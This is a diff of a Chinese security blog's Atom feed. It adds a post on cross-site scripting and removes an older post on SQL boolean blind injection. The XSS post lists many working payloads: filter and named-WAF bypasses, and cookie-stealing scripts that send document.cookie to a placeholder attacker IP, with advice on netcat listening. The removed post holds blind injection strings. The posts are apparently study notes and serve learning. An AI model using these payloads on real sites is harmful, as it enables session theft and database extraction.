@@ -6,7 +6,7 @@
   <link href="https://liu1272.github.io/atom.xml" rel="self"/>
   
   <link href="https://liu1272.github.io/"/>
-  <updated>2023-04-16T15:14:06.042Z</updated>
+  <updated>2023-04-21T07:52:15.503Z</updated>
   <id>https://liu1272.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>XSS跨站攻击</title>
+    <link href="https://liu1272.github.io/2023/04/21/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
+    <id>https://liu1272.github.io/2023/04/21/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/</id>
+    <published>2023-04-21T06:32:00.000Z</published>
+    <updated>2023-04-21T07:52:15.503Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>   XSS又叫CSS（Cross Site Script）是指恶意攻击者往Web页面里插入恶意Script代码<br>   当用户<code>浏览该页</code>时，其中的Script代码会被执行，从而达到恶意攻击用户的目的。<br>   xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，所以xss漏洞关键就是寻找参数未过滤的输出函数。<br>   常见的输出函数有：echo printf print print_r sprintf die var-dump var_export</p><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>（1）攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）<br>（2）诱使受害者打开受到攻击的服务器URL<br>（3）受害者在Web浏览器中打开URL时自动执行恶意脚本</p><h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><p>（1）反射型XSS：&lt;非持久化&gt;<br>需要欺骗用户自己去点击链接才能触发XSS代码，一般容易出现在搜索页面，由后端代码进行处理。<br>（2）存储型XSS：&lt;持久化&gt;<br>每当有用户访问污染页面的时候都会触发代码执行。代码存储在服务器数据库中，如在个人信息或发表文章等地方。<br>（3）DOM型XSS：<br>DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。<br>DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。<br>客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行。<br>如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。<br>一般是浏览器前端代码进行处理。</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>1.挂马<br>2.盗取用户Cookie。<br>3.DOS（拒绝服务）客户端浏览器。<br>4.钓鱼攻击，高级的钓鱼技巧。<br>5.删除目标文章、恶意篡改数据、嫁祸。<br>6.劫持用户Web行为，甚至进一步渗透内网。<br>7.爆发Web2.0蠕虫。<br>8.蠕虫式的DDoS攻击。<br>9.蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>各种标签的XSS形式</strong></p><pre><code>&lt;script&gt; 标签用于定义客户端脚本，比如 JavaScript。&lt;script&gt;alert(1);&lt;/script&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&lt;img&gt; 标签定义 HTML 页面中的图像。&lt;img src=1 onerror=alert(1);&gt;&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;&lt;input&gt; 标签规定了用户可以在其中输入数据的输入字段。onfocus 事件在对象获得焦点时发生：&lt;input onfocus=alert(1);&gt;&lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt;&lt;input onfocus=&quot;alert(1);&quot; autofocus&gt;&quot; οnclick=alert(1)&gt;        这样需要点击一下输入框&lt;br&gt;&quot; onmouseover=alert(1)&gt;    需要鼠标划过输入框&lt;br&gt;&lt;details&gt; 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 &lt;details&gt; 元素时触发：&lt;details ontoggle=alert(1);&gt;&lt;svg&gt; 标签用来在HTML页面中直接嵌入SVG 文件的代码。&lt;svg onload=alert(1);&gt;&lt;select&gt; 标签用来创建下拉列表。&lt;select onfocus=alert(1)&gt;&lt;/select通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：&lt;select onfocus=alert(1) autofocus&gt;&lt;iframe&gt; 标签会创建包含另外一个文档的内联框架。&lt;iframe onload=alert(1);&gt;&lt;/iframe&gt;&lt;video&gt; 标签定义视频，比如电影片段或其他视频流。&lt;audio&gt; 标签定义声音，比如音乐或其他音频流。&lt;audio src=x  onerror=alert(1);&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;body&gt; 标签定义文档的主体。&lt;body onload=alert(1);&gt;onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发&lt;bodyonscroll=alert(1);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;&lt;textarea&gt; 标签定义一个多行的文本输入控件。&lt;textarea onfocus=alert(1); autofocus&gt;&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐&lt;marquee onstart=alert(1)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以&lt;isindex type=image src=1 onerror=alert(1)&gt;//仅限于IE</code></pre><p><strong>绕过过滤方法</strong></p><pre><code>【空格过滤】/**/注释符号绕过/符号绕过【引号过滤】如果是html标签中，可以不用引号在js中，可以用反引号代替单双引号【括号过滤】使用throw绕过 throw 语句用于当错误发生时抛出一个错误【关键字过滤】大小写绕过双写绕过字符串拼接绕过（利用eval()函数）在js中用反引号代替单双引号编码绕过    Unicode编码绕过    &lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&quot;&gt;    javasc&amp;#x72;&amp;#x69;pt:alert(/xss/)          (编码了r和i)    &lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061&#39;)&quot;&gt;    url编码绕过    &lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61&#39;))&quot;&gt;    &lt;iframe src=&quot;data:text/html,%3C&quot;&gt;&lt;/iframe&gt;    Ascii码绕过    &lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108))&quot;&gt;    hex绕过    &lt;img src=x onerror=eval(&#39;\x61&#39;)&gt;    base64绕过    &lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;XXXXX==&#39;))&quot;&gt;    &lt;iframe src=&quot;data:text/html;base64,XXXXX==&quot;&gt;【过滤url地址】使用url编码    &lt;img src=&quot;x&quot; onerror=document.location=`http://%77/`&gt;    javasc&amp;#x72;&amp;#x69;pt:alert(&#39;xsshttp://&#39;)使用IP    十进制IP    &lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;    八进制IP    &lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt;    十六进制IP    &lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;    html标签中用//代替http://    &lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;    使用\\    使用中文逗号代替英文逗号    &lt;img src=&quot;x&quot; onerror=&quot;document.location=`http:\\www。baidu。com`&quot;&gt;【单引号闭合+htmlspecialchars函数绕过】&#39;onmouseover=&#39;alert(/xss/)【JavaScript伪协议】&quot;&gt;&lt;a href=javascript:alert(/xss/)&gt;                  o_n和&lt;scr_ipt&gt;过滤【HttpOnly绕过】什么是HttpOnly？cookie中设置了HttpOnly属性后js脚本将无法读取到cookie信息但是使用下面这样仍然可以读取Cookie cookies[]=request.getCookies();【其它waf绕过思路】（1）标签语法替换&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XSS&quot;)&lt;/scr&lt;script&gt;ipt&gt;&lt;script src=&quot;http://xxx/&quot;&gt;&lt;/script&gt;（2）特殊符号干扰（3）提交方式更改（4）垃圾数据溢出（5）加密解密算法（6）结合其他漏洞绕过</code></pre><h4 id="结合其他漏洞绕过"><a href="#结合其他漏洞绕过" class="headerlink" title="结合其他漏洞绕过"></a>结合其他漏洞绕过</h4><pre><code>WAF名称：CloudflarePayload：&lt;a”/onclick=(confirm)()&gt;click绕过技术：非空格填充WAF名称：WordfencePayload：&lt;a/href=javascript&amp;colon;alert()&gt;click绕过技术：数字字符编码WAF名称：BarracudaPayload：&lt;a/href=Java%0a%0d%09script&amp;colon;alert()&gt;click绕过技术：数字字符编码WAF名称：ComodoPayload：&lt;d3v/onauxclick=(((confirm)))“&gt;click绕过技术：黑名单中缺少事件处理器以及函数调用混淆WAF名称：F5Payload：&lt;d3v/onmouseleave=[2].some(confirm)&gt;click绕过技术：黑名单中缺少事件处理器以及函数调用混淆WAF名称：ModSecurityPayload：&lt;details/open/ontoggle=alert()&gt;绕过技术：黑名单中缺少标签或事件处理器WAF名称：dotdefenderPayload：&lt;details/open/ontoggle=(confirm)()//绕过技术：黑名单中缺少结束标签、事件处理器和函数调用混淆</code></pre><h4 id="还有一些很重要的东西"><a href="#还有一些很重要的东西" class="headerlink" title="还有一些很重要的东西"></a>还有一些很重要的东西</h4><p>xss网站最好自己搭建一个，因为可能会过滤xss关键字<br>最好使用只带有数字的域名或ip<br>利用vps，用nc端口监听</p><h4 id="XSStrike工具使用"><a href="#XSStrike工具使用" class="headerlink" title="XSStrike工具使用"></a>XSStrike工具使用</h4><p><a href="https://blog.csdn.net/RuoLi_s/article/details/113192507?ops_request_misc=&request_id=&biz_id=102&utm_term=XSStrike&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-113192507.nonecase&spm=1018.2226.3001.4187"><strong>使用说明</strong></a></p><h4 id="XSS的防御措施"><a href="#XSS的防御措施" class="headerlink" title="XSS的防御措施"></a>XSS的防御措施</h4><p>（1）编码：对用户输入的数据进行HTML Entity编码<br>（2）过滤：移除用户上传的DOM属性，如onerror等，移除用户上传的style节点，script节点，iframe节点等。<br>（3）校正：避免直接对HTML Entity编码，使用DOM Prase转换，校正不配对的DOM标签。</p><h4 id="各种姿势"><a href="#各种姿势" class="headerlink" title="各种姿势"></a>各种姿势</h4><pre><code>&lt;script&gt;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&lt;/script&gt;&lt;script&gt;var img = document.createElement(&quot;img&quot;);img.src = &quot;http://你的公网ip:端口号/?cookie=&quot;+document.cookie;&lt;/script&gt;&lt;script&gt;window.location.href=&#39;http://你的公网ip:端口号/&#39;+document.cookie&lt;/script&gt;&lt;script&gt;location.href=&#39;http://你的公网ip:端口号/&#39;+document.cookie&lt;/script&gt;&lt;input onfocus=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot; autofocus&gt;&lt;svg onload=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot;&gt;&lt;iframe onload=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;&lt;body onload=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot;&gt;</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h4 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h4&gt;&lt;p&gt;   XSS又叫CSS（Cross Site Script）是指恶意攻击者往Web页面里插入恶意Script代码&lt;br&gt;  </summary>
+      
+    
+    
+    
+    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
+    
+    
+    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>一句话木马</title>
@@ -435,31 +459,6 @@
       
     <summary type="html">&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表现&quot;&gt;&lt;/a&gt;表现&lt;/h4&gt;&lt;p&gt;数据库在执行时，遇到语法不对，会显示报错信息，比如错误语句:select’&lt;/p&gt;
 &lt;h4 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; cl</summary>
-      
-    
-    
-    
-    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
-    
-    
-    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQL布尔盲注(延时注入后面再写)</title>
-    <link href="https://liu1272.github.io/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
-    <id>https://liu1272.github.io/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</id>
-    <published>2023-03-12T02:39:00.000Z</published>
-    <updated>2023-03-12T03:36:37.119Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>在测试中不会展现任何数据库报错内容，但是网页中真和假有着不同的回显。<br>或者为真时返回正常页面，为假时跳转到其它页面等。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在后端的PHP代码中，对你传入的数据进行了处理并判断<br>判断是True或False会执行不同代码</p><h4 id="开始注入-二分法"><a href="#开始注入-二分法" class="headerlink" title="开始注入(二分法)"></a>开始注入(二分法)</h4><h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>使用一些判断真假的语句来进行判定<br>当它是数字型时:</p><pre><code>1&#39; and 1=0 --+1&#39; and 1=1 --+</code></pre><p>如果第一个与第二个回显不一样那么可能是布尔盲注<br>但是不排除有些丧心病狂的扑街预判了你的预判<br>这时候修改为不常见的数值（如1352=1352等）</p><p>当它是字符串型注入时:</p><pre><code>1&#39; and &#39;1&#39;=&#39;114514 --+1&#39; and &#39;1&#39;=&#39;666 --+</code></pre><h5 id="猜数据库名长度"><a href="#猜数据库名长度" class="headerlink" title="猜数据库名长度"></a>猜数据库名长度</h5><p>这个应该很好理解吧，既然它不告诉你有啥，那你就自己猜咯。<br>刚刚好又有and可以判断语句，是不是天无绝人之路？</p><pre><code>1&#39; and (length(database()))&gt;x--+</code></pre><p>当报错的时候就说明数据库名字长度是x-1了嘛</p><h5 id="猜数据库名（ASCII码）"><a href="#猜数据库名（ASCII码）" class="headerlink" title="猜数据库名（ASCII码）"></a>猜数据库名（ASCII码）</h5><pre><code>1&#39; and ascii(substr(database(),1,1))&gt;100--+1&#39; and ascii(substr(database(),1,1))&lt;150--+</code></pre><p>这样子一直用二分法来缩小数据库名的ASCII码范围直到求出最终值。<br>是不是很麻烦？是就对了！<br>现在是告诉你注入原理，不看就滚犊子。</p><h5 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h5><pre><code>1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100--+1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;150--+</code></pre><p>方法其实是和前面的联合查询注入一样的，多了个二分法而已<br>其实拿SQLmap和BP跑也是差不多的原理，只是自动化注入罢了</p><h5 id="猜字段名"><a href="#猜字段名" class="headerlink" title="猜字段名"></a>猜字段名</h5><pre><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)))&gt;50--+1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)))&lt;80--+</code></pre><p>还是一样的</p><h5 id="猜数据"><a href="#猜数据" class="headerlink" title="猜数据"></a>猜数据</h5><pre><code>1&#39; and (ascii(substr(( select  id users limit 0,1),1,1)))&lt;80--+1&#39; and (ascii(substr(( select  id users limit 0,1),1,1)))&gt;30--+</code></pre><p>仍然是一样的</p><h4 id="开始注入-字符判断法"><a href="#开始注入-字符判断法" class="headerlink" title="开始注入(字符判断法)"></a>开始注入(字符判断法)</h4><p>数据库名字长度的判断跟上面的的一样<br>对每一位猜解都要写很多次判断语句<br>判断这些字符数字</p><pre><code>0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_</code></pre><h4 id="使用Burp-Suite注入"><a href="#使用Burp-Suite注入" class="headerlink" title="使用Burp_Suite注入"></a>使用Burp_Suite注入</h4><p>由于手工进行一一判断，工作量较大，可使用Burp_Suite中的字典进行。<br>1、抓包并将数据包传送到intruder<br>2、对对应位置进行上面提到的字符数字爆破:</p><pre><code>http://192.168.162.128/?id=1&#39; and if(SUBSTRING(database(),$1$,1)=$d$,1,0)–+&amp;Submit=Submit#</code></pre><p>payload set中分别设置并开始attack:<br>number类型，从1到数据库名字长度，步长为1<br>simple list类型，导入字符数字的字典</p><p><em><strong>后面的同理，自己举一反三吧</strong></em></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表现&quot;&gt;&lt;/a&gt;表现&lt;/h4&gt;&lt;p&gt;在测试中不会展现任何数据库报错内容，但是网页中真和假有着不同的回显。&lt;br&gt;或者为真时返回正常页面，为假时跳转到其它页面等。&lt;/p&gt;
-&lt;h4</summary>
       
     
     
